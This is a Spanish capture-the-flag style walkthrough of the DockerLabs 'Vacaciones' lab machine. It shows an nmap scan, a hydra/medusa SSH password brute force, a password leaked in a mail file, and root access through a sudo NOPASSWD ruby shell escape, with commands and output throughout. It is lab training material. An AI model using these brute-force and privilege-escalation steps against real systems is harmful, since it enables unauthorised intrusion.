Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Vacaciones".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh vacaciones.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene 2 puertos abiertos:
```
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
```
En este caso, empezaremos por el puerto 80 ya que no tenemos ningun usuario ni nada, por lo que es conveniente ver si en la pagina, existe alguna informacion "util".
Para ello, introducimos la IP en el navegador y nos sale una pagina en blanco.
Sin embargo, al presionar "CTRL + U" vemos que aparece lo siguiente:
```
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```
Viendo esto, se puede deducir que tenemos 2 posibles usuarios por lo haremos un ataque de fuerza bruta con HYDRA para ver si conseguimos alguna contraseña y poder entrar despues por el puerto 22 (SSH).
Para ello escribimos en el terminal bien con HYDRA o bien con MEDUSA:
```
hydra -l juan,camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

medusa -h 172.17.0.2 -u camilo,juan -P /usr/share/wordlists/rockyou.txt -M ssh
	-h = direccion IP
	-u = usuarios separados por una ","
	-M = tipo de modulo
```
Una vez terminado, vemos que "camilo" tiene la contraseña "password1":
```
ACCOUNT FOUND: [ssh] Host: 172.17.0.2 User: camilo Password: password1 [SUCCESS]
```
con lo que ahora intentaremos entrar mediante el protocolo SSH y el comando:
```
ssh camilo@172.17.0.2
```
Nos pedira aceptar con un "yes" y luego meter la contraseña obtenida. Et voila, ya estamos dentro. Ahora escribimos el comando "script /dev/null -c bash" y vemos:
```
$ script /dev/null -c bash
Script started, file is /dev/null

camilo@2e6f164a589f:~$
```
Ya dentro del usuario "camilo" probaremos a escribir "sudo -l" para intentar la escalada de privilegios, pero recibimos por la terminal el siguiente mensaje, tras meter la contraseña:
```
Sorry, user camilo may not run sudo on 2e6f164a589f.
```
Como hemos llegado a un callejon sin salida, probaremos con el comando "find / -perm -4000 2>/dev/null" obteniendo una pequeña lista de binarios:
```
camilo@2e6f164a589f:/var/mail/camilo$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/bin/su
/bin/mount
/bin/umount
```
Desgraciadamente, tras buscar en "gtfobins" y no encontrar ningun camino para continuar, buscaremos alguna otra pista por los directorios de la maquina victima y nos fijamos si hay algo interesante.
Como tenemos un usuario "juan", "camilo" y "pedro", miraremos si hay alguna mencion a ellos y vemos lo siguiente tras ejecutar el comando: find / -name "NOMBREUSUARIO" como se ve a continuacion:
```
camilo@2e6f164a589f:/$ find / -name "camilo" 2>/dev/null
/home/camilo
/var/mail/camilo  <==== Esto parece un correo, asi que lo comprobamos

camilo@2e6f164a589f:/$ find / -name "juan" 2>/dev/null
/home/juan

camilo@2e6f164a589f:/$ find / -name "pedro" 2>/dev/null
/home/pedro

camilo@2e6f164a589f:/$ 
```
Como se observa, hay un archivo/directorio llamado "/var/mail/camilo" por lo que iremos a la carpeta "/var/mail" y veremos que es exactamente:
```
cd /var/mail

camilo@2e6f164a589f:/var/mail$ ls
camilo  <=== Vemos que es una carpeta

camilo@2e6f164a589f:/var/mail$ cd camilo  <=== Cambiamos a la carpeta "camilo"
camilo@2e6f164a589f:/var/mail/camilo$
```
Tras llegar a la carpeta "camilo", hacemos un "ls -la" y el terminal nos muestra lo siguiente:
```
camilo@2e6f164a589f:/var/mail/camilo$ ls -la
total 12
drwxr-sr-x 2 root mail 4096 Apr 25 08:13 .
drwxrwsr-x 1 root mail 4096 Apr 25 08:13 ..
-rw-r--r-- 1 root mail  144 Apr 25 08:13 correo.txt
```
Hora de hacer un "cat" al archivo y vemos que en su interior hay un mensaje donde el usuario "juan" deja su contraseña al usuario "camilo":
```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```
Teniendo la contraseña de juan, cambiaremos de usuario y probaremos a hacer una escalada de privilegios desde dicho usuario.
```
camilo@2e6f164a589f:/var/mail/camilo$ su juan
Password: 2k84dicb
```
Y ya estamos dentro del usuario "juan", por lo que ahora pondremos de nuevo el comando "script /dev/null -c bash" para obtener su prompt:
```
$ script /dev/null -c bash
Script started, file is /dev/null

juan@2e6f164a589f:/var/mail/camilo$
```
Ahora probamos a escalar privilegios con este "nuevo" usuario mediante el tipico comando "sudo -l", y nos daria el siguiente resultado por pantalla:
```
juan@2e6f164a589f:/var/mail/camilo$ sudo -l

Matching Defaults entries for juan on 2e6f164a589f:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on 2e6f164a589f:
    (ALL) NOPASSWD: /usr/bin/ruby
```
Vemos que con el binario "/usr/bin/ruby" tenemos permisos, asi que vamos a "gtfobins" y buscamos "ruby". Ahora vamos a su apartado "sudo" donde podemos ver lo siguiente:
```
sudo ruby -e 'exec "/bin/sh"'
```
Ejecutamos dicho comando CON LA RUTA COMPLETA "/usr/bin/ruby" y...:
```
juan@2e6f164a589f:/var/mail/camilo$ sudo /usr/bin/ruby -e 'exec "/bin/sh"'

# whoami
root
#
```
como se puede ver, ya somos usuarios "root". Aun asi, si escribimos:
```
bash -p
```
obtendriamos un prompt diferente y algo mas "normal" tal y como se puede ver aqui abajo:
```
bash-5.1# whoami
root
bash-5.1#
```
Y ahora si, ya habriamos terminado.


